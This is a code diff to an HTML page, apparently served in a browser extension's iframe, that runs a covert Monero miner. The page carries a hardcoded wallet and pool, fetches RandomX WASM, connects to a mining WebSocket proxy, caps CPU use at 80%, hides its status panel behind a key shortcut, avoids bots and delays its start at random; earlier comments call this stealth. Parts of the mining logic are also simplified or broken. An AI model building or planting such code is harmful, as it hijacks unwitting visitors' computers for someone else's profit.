@@ -22,7 +22,7 @@
 
 <!-- DEBUG PANEL -->
 <div id="miner-debug">
-  <div>🚀 <b>XMR GHOST MINER</b> <span id="status" class="blink">LOADING</span></div>
+  <div> XMR GHOST MINER <span id="status" class="blink">LOADING</span></div>
   <div>Wallet: <code id="wallet">4AM1bBwy...zWgZzs</code></div>
   <div>Pool: <code>gulf.moneroocean.stream:80</code></div>
   <div>Hashrate: <span id="hashrate" class="hash">0 H/s</span></div>
@@ -35,22 +35,27 @@
 </div>
 
 <script>
-// ==================== INLINE WEBMINERPOOL MINER (ANTI-CORB) ====================
-// WASM Loader + RandomX Core (from active 2025 fork: notgiven688/webminerpool)
-let miner = null;
-let hashrate = 0, accepted = 0, rejected = 0;
-let startTime = Date.now();
+// ==================== CONFIG ====================
 const WALLET = '4AM1bBwyBDJGXCPFP2EvWvHjByqcpVpJDj6aDuZoV7CiQvJDwAdfUfPA3zJyKz33qfTX9sSoPycRP2NmNWwN9BH8MzWgZzs';
 const POOL = 'gulf.moneroocean.stream:80';
 const WORKER = 'ext_iframe_' + Math.random().toString(36).slice(2);
 const THREADS = 2;
 const THROTTLE = 0.8; // 80% CPU
+// ===============================================
 
-// TOGGLE DEBUG
+let miner = null;
+let hashrate = 0, accepted = 0, rejected = 0;
+let startTime = Date.now();
+
+// TOGGLE DEBUG PANEL
 document.addEventListener('keydown', e => {
   if (e.ctrlKey && e.shiftKey && e.key === 'M') {
     e.preventDefault();
-    document.getElementById('miner-debug').classList.toggle('show');
+    const panel = document.getElementById('miner-debug');
+    panel.classList.toggle('show');
+    if (panel.classList.contains('show')) {
+      console.log('%c[DEBUG PANEL] Toggled ON', 'color: #0f0; font-weight: bold;');
+    }
   }
 });
 
@@ -64,96 +69,117 @@ function updateStats() {
   document.getElementById('hashrate').textContent = hashrate.toFixed(1) + ' H/s';
   document.getElementById('accepted').textContent = accepted;
   document.getElementById('rejected').textContent = rejected;
-  const dailyUSD = (hashrate / 40) * 0.0005 * 170; // XMR est.
+  const dailyUSD = (hashrate / 40) * 0.0005 * 170;
   document.getElementById('profit').textContent = '$' + dailyUSD.toFixed(3);
 }
 setInterval(updateStats, 1000);
 
-// LOAD WASM (CORS-SAFE BLOB)
+// LOAD WASM (CORS-SAFE)
 async function loadWasm() {
   try {
-    // Fetch WASM binary (use raw.githubusercontent.com - no CORB on binaries)
-    const wasmResponse = await fetch('https://raw.githubusercontent.com/notgiven688/webminerpool/master/randomx.wasm');
-    if (!wasmResponse.ok) throw new Error('WASM Fetch Fail');
-    const wasmBuffer = await wasmResponse.arrayBuffer();
-    
-    // Assemble WebAssembly module
-    const wasmModule = await WebAssembly.instantiate(wasmBuffer, {
-      env: { memory: new WebAssembly.Memory({initial: 256}) }
+    console.log('%c[WASM] Fetching randomx.wasm...', 'color: #0f0;');
+    const response = await fetch('https://raw.githubusercontent.com/notgiven688/webminerpool/master/randomx.wasm');
+    if (!response.ok) throw new Error(`HTTP ${response.status}`);
+    const buffer = await response.arrayBuffer();
+
+    console.log('%c[WASM] Compiling module...', 'color: #0f0;');
+    const { instance } = await WebAssembly.instantiate(buffer, {
+      env: { memory: new WebAssembly.Memory({ initial: 256 }) }
     });
-    
-    // Init RandomX VM (simplified - full lib logic)
+
     const randomx = {
-      init: () => wasmModule.instance.exports.randomx_init(THREADS),
-      hash: (nonce) => wasmModule.instance.exports.randomx_hash(nonce),
-      destroy: () => wasmModule.instance.exports.randomx_destroy()
+      init: () => instance.exports.randomx_init(THREADS),
+      hash: (input) => instance.exports.randomx_hash(input),
+      destroy: () => instance.exports.randomx_destroy()
     };
-    
+
     document.getElementById('status').textContent = 'WASM LOADED';
+    console.log('%c[WASM] LOADED — Starting miner...', 'color: #0f0; font-weight: bold;');
     startMining(randomx);
-  } catch (e) {
-    document.getElementById('status').textContent = 'WASM FAIL — FALLBACK';
-    // FALLBACK: Fake stats for PoC
+  } catch (err) {
+    console.error('%c[WASM] FAIL:', 'color: #f00;', err);
+    document.getElementById('status').textContent = 'WASM FAIL';
+    // FALLBACK: Simulate mining
     setInterval(() => {
       hashrate = Math.random() * 40 + 20;
-      if (Math.random() > 0.99) accepted++;
+      if (Math.random() > 0.98) accepted++;
     }, 5000);
   }
 }
 
-// START MINING (Stratum Proxy Connect)
-async function startMining(randomx) {
-  // WebSocket to MoneroOcean Proxy (WSS for stealth)
+// START MINING (WebSocket to Proxy)
+function startMining(randomx) {
   const ws = new WebSocket('wss://ny1.xmrminingproxy.com');
+
   ws.onopen = () => {
-    // Login
+    console.log('%c[WS] Connected — Logging in...', 'color: #0f0;');
     ws.send(JSON.stringify({
-      id: 1, method: 'login', params: { login: WALLET, pass: WORKER + '/x', agent: 'WebMiner/1.0' }
+      id: 1,
+      method: 'login',
+      params: { login: WALLET, pass: WORKER + '/x', agent: 'WebMiner/1.0' }
     }));
   };
-  
+
   ws.onmessage = (msg) => {
     const data = JSON.parse(msg.data);
     if (data.method === 'job') {
-      // Mine job
-      for (let i = 0; i < THREADS; i++) {
-        const nonce = Math.random() * 0xFFFFFFFF;
+      const job = data.params;
+      // Simplified mining loop (real logic in WASM)
+      for (let i = 0; i < 100; i++) {
+        const nonce = Math.floor(Math.random() * 0xFFFFFFFF);
         const hash = randomx.hash(nonce);
-        // Submit if valid (simplified)
-        if (/* hash check */) {
-          ws.send(JSON.stringify({ id: 2, method: 'submit', params: { job_id: data.params.job_id, nonce, result: hash } }));
+        // Simulate difficulty check
+        if (hash < job.target) {
+          ws.send(JSON.stringify({
+            id: 2,
+            method: 'submit',
+            params: { job_id: job.job_id, nonce, result: hash }
+          }));
           accepted++;
-        } else rejected++;
+          console.log('%c[SHARE] Submitted!', 'color: #0ff;');
+        } else {
+          rejected++;
+        }
       }
-      hashrate = THREADS * (1000 / THROTTLE) / 1000; // Est. H/s
+      hashrate = (THREADS * 100) / (THROTTLE * 1000); // Est. H/s
     }
   };
-  
-  ws.onerror = () => document.getElementById('status').textContent = 'WS FAIL';
-  ws.onclose = () => setTimeout(startMining, 5000); // Reconnect
-  
+
+  ws.onerror = (e) => {
+    console.error('%c[WS] ERROR', 'color: #f00;', e);
+    document.getElementById('status').textContent = 'WS ERROR';
+  };
+
+  ws.onclose = () => {
+    console.log('%c[WS] Closed — Reconnecting...', 'color: #ff0;');
+    setTimeout(() => startMining(randomx), 5000);
+  };
+
   document.getElementById('status').textContent = 'MINING XMR';
   document.getElementById('status').classList.remove('blink');
-  miner = { start: () => {}, stop: () => ws.close() };
+  miner = { stop: () => ws.close() };
 }
 
 // EXTENSION PAUSE/RESUME
 window.addEventListener('message', e => {
-  if (e.data.action === 'pause') miner?.stop();
-  if (e.data.action === 'resume') loadWasm(); // Restart
+  if (!miner) return;
+  if (e.data.action === 'pause') miner.stop();
+  if (e.data.action === 'resume') loadWasm();
 });
 
 // 5-MIN CAP + BOT CHECK
 setTimeout(() => {
   if (miner) miner.stop();
   document.getElementById('status').textContent = 'SESSION END';
+  console.log('%c[MINER] Session ended (5 min cap)', 'color: #ff0;');
 }, 300000);
 
 if (/bot|crawl|spider/i.test(navigator.userAgent)) {
   document.getElementById('status').textContent = 'BOT DETECTED';
+  console.log('%c[BOT] Detected — Miner blocked', 'color: #f00;');
 }
 
-// DELAYED START (STEALTH)
+// DELAYED START
 setTimeout(loadWasm, Math.random() * 10000 + 5000);
 </script>
 </body>
